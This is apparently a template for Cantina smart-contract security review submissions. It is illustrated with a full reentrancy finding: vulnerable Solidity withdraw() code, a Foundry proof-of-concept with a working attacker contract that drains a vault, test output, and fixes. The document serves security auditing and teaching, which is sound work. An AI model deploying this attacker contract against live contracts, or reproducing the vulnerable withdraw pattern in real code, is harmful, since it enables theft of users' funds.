# Cantina Report Template

Template for Cantina managed security review submissions.

---

## Individual Finding Format

Each finding is submitted separately through the Cantina platform.

### Finding Template

```markdown
## Summary

[1-2 sentence summary of the issue. Keep it brief and clear.]

A reentrancy vulnerability in the `withdraw()` function allows attackers to drain all funds from the contract.

---

## Finding Description

[Detailed technical explanation of the vulnerability]

The `withdraw()` function in `Contract.sol` violates the Checks-Effects-Interactions (CEI) pattern by making an external call before updating state:

**Vulnerable Code:**

```solidity
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient balance");

    // External call BEFORE state update - CEI violation
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");

    balances[msg.sender] -= amount;  // State update AFTER external call
}
```

**Security Guarantee Broken:**
This breaks the reentrancy protection guarantee. The function assumes sequential execution, but an attacker's `receive()` callback can re-enter before `balances` is decremented.

**Attack Propagation:**
1. Attacker deploys malicious contract with `receive()` function
2. Attacker calls `withdraw(1 ether)`
3. Contract sends ETH, triggering attacker's `receive()`
4. `receive()` re-enters `withdraw(1 ether)` while `balances` still shows original amount
5. Process repeats until contract is drained
6. Stack unwinds, all balance decrements execute on already-drained contract

---

## Impact Explanation

[Elaborate on why you've chosen this impact level]

**Impact: Critical/High**

This is rated as High/Critical because:

1. **Direct fund loss** - All ETH held by the contract can be stolen
2. **No limitations** - Any user with a non-zero balance can execute the attack
3. **No recovery** - Stolen funds cannot be recovered
4. **Affects all users** - Every depositor loses their funds, not just the attacker's victims

The attack requires:
- Deploying a single malicious contract (~0.01 ETH gas cost)
- Having any non-zero balance in the protocol

---

## Likelihood Explanation

[Explain how likely this is to occur]

**Likelihood: High**

This vulnerability is highly likely to be exploited because:

1. **Low barrier to entry** - Standard reentrancy attack pattern widely known
2. **High incentive** - Direct financial gain for attacker
3. **Easy detection** - Automated tools and bots scan for CEI violations
4. **No external dependencies** - Attack works in any market condition
5. **Proven attack vector** - Similar vulnerabilities have been exploited (e.g., The DAO hack)

Given the TVL at risk and the simplicity of exploitation, this would likely be exploited within hours of deployment.

---

## Proof of Concept

[Demonstrate the vulnerability with working code]

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Contract.sol";

contract ReentrancyPoC is Test {
    Vault vault;
    Attacker attacker;

    function setUp() public {
        vault = new Vault();
        attacker = new Attacker(address(vault));

        // Seed vault with victim funds (simulating real users)
        address victim1 = makeAddr("victim1");
        address victim2 = makeAddr("victim2");

        vm.deal(victim1, 5 ether);
        vm.deal(victim2, 5 ether);

        vm.prank(victim1);
        vault.deposit{value: 5 ether}();

        vm.prank(victim2);
        vault.deposit{value: 5 ether}();
    }

    function test_ReentrancyDrain() public {
        // Attacker starts with 1 ETH
        vm.deal(address(attacker), 1 ether);

        uint256 vaultBalanceBefore = address(vault).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;

        console.log("=== Before Attack ===");
        console.log("Vault balance:", vaultBalanceBefore);
        console.log("Attacker balance:", attackerBalanceBefore);

        // Execute attack
        attacker.attack{value: 1 ether}();

        uint256 vaultBalanceAfter = address(vault).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;

        console.log("=== After Attack ===");
        console.log("Vault balance:", vaultBalanceAfter);
        console.log("Attacker balance:", attackerBalanceAfter);
        console.log("Attacker profit:", attackerBalanceAfter - attackerBalanceBefore);

        // Assertions
        assertEq(vaultBalanceAfter, 0, "Vault should be drained");
        assertEq(attackerBalanceAfter, 11 ether, "Attacker should have all funds");
    }
}

contract Attacker {
    Vault public vault;
    uint256 public attackAmount = 1 ether;

    constructor(address _vault) {
        vault = Vault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw(attackAmount);
    }

    receive() external payable {
        if (address(vault).balance >= attackAmount) {
            vault.withdraw(attackAmount);
        }
    }
}
```

**Execution:**
```bash
forge test --match-test test_ReentrancyDrain -vvv
```

**Output:**
```
[PASS] test_ReentrancyDrain()
Logs:
  === Before Attack ===
  Vault balance: 10000000000000000000
  Attacker balance: 1000000000000000000
  === After Attack ===
  Vault balance: 0
  Attacker balance: 11000000000000000000
  Attacker profit: 10000000000000000000
```

---

## Recommendation

[Specific fix with code example]

**Option 1: Follow CEI Pattern**

Update state before making external calls:

```solidity
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount, "Insufficient balance");

    // Effects: Update state FIRST
    balances[msg.sender] -= amount;

    // Interactions: External call LAST
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
}
```

**Option 2: Use ReentrancyGuard (Recommended)**

Add OpenZeppelin's `nonReentrant` modifier for defense in depth:

```solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Vault is ReentrancyGuard {
    function withdraw(uint256 amount) external nonReentrant {
        require(balances[msg.sender] >= amount, "Insufficient balance");

        balances[msg.sender] -= amount;

        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
```

**Recommendation:** Apply both fixes - CEI pattern AND ReentrancyGuard for defense in depth.
```

---

## Severity Guidelines

Cantina uses the following severity classification:

| Severity | Criteria |
|----------|----------|
| **Critical** | Direct loss of funds, protocol insolvency, permanent DoS |
| **High** | Significant fund loss, major functionality broken |
| **Medium** | Conditional fund loss, limited impact scenarios |
| **Low** | Best practices, minor issues, unlikely scenarios |
| **Informational** | Code quality, suggestions, non-security observations |
| **Gas Optimization** | Efficiency improvements |

---

## Required Sections Checklist

- [ ] **Summary** - Brief 1-2 sentence description
- [ ] **Finding Description** - Detailed technical explanation with code
- [ ] **Impact Explanation** - Why this severity level was chosen
- [ ] **Likelihood Explanation** - How likely exploitation is
- [ ] **Proof of Concept** - Working code demonstrating the issue (Critical/High/Medium)
- [ ] **Recommendation** - Specific fix with code snippet

---

## Best Practices

1. **Be concise in Summary** - Judges read many reports, get to the point
2. **Show code flow** - Trace how malicious input reaches vulnerable code
3. **Justify severity** - Don't just claim "High", explain why
4. **Realistic likelihood** - Consider actual deployment conditions
5. **Working PoC** - Especially important for submissions under 80 reputation
6. **Actionable recommendations** - Provide copy-paste ready fixes

---

## Common Rejection Reasons

- Poorly written or incorrect findings
- Missing required sections
- No PoC for Critical/High/Medium (under 80 reputation)
- Theoretical vulnerability without realistic attack path
- Incorrect severity assessment
- Finding already in known issues or out of scope
- Duplicate of another submission
